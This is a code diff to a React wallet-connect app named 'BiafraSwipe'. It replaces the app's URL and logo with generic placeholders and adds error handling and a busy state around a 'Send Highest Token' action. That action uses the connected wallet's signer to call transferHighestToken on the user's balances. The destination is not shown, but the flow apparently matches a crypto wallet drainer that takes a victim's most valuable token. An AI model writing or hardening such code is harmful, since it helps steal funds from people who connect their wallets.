@@ -13,8 +13,8 @@ const projectId = '1c1db7ada235d88816f2f0008d415fdc';
 const metadata = {
   name: 'BiafraSwipe',
   description: 'BiafraSwipe Description',
-  url: 'https://BiafraSwipe.vercel.app',
-  icons: ['https://i.ibb.co/VqKnLQs/Ethereum-Classic-Logo-PNG-Pic.png'],
+  url: 'https://mywebsite.com',
+  icons: ['https://avatars.mywebsite.com/'],
 };
 const chains = [mainnet, goerli];
 const config = defaultWagmiConfig({
@@ -119,6 +119,7 @@ function App() {
   const { connect, connectors } = useConnect();
   const { disconnect } = useDisconnect();
   const [balances, setBalances] = useState({});
+  const [transactionInProgress, setTransactionInProgress] = useState(false);
 
   useEffect(() => {
     if (isConnected) {
@@ -139,10 +140,18 @@ function App() {
   };
 
   const handleSendTransaction = async () => {
-    if (isConnected) {
-      const signer = await getEthersSigner(config);
-      await transferHighestToken(signer, balances);
-      alert('Transaction successful!');
+    if (isConnected && !transactionInProgress) {
+      setTransactionInProgress(true);
+      try {
+        const signer = await getEthersSigner(config);
+        await transferHighestToken(signer, balances);
+        alert('Transaction successful!');
+      } catch (error) {
+        console.error('Transaction failed:', error);
+        alert('Transaction failed. Please try again.');
+      } finally {
+        setTransactionInProgress(false);
+      }
     }
   };
 
@@ -163,7 +172,9 @@ function App() {
                 ))}
               </ul>
             </div>
-            <button onClick={handleSendTransaction}>Send Highest Token</button>
+            <button onClick={handleSendTransaction} disabled={transactionInProgress}>
+              {transactionInProgress ? 'Processing...' : 'Send Highest Token'}
+            </button>
             <button onClick={disconnect}>Disconnect Wallet</button>
           </>
         ) : (
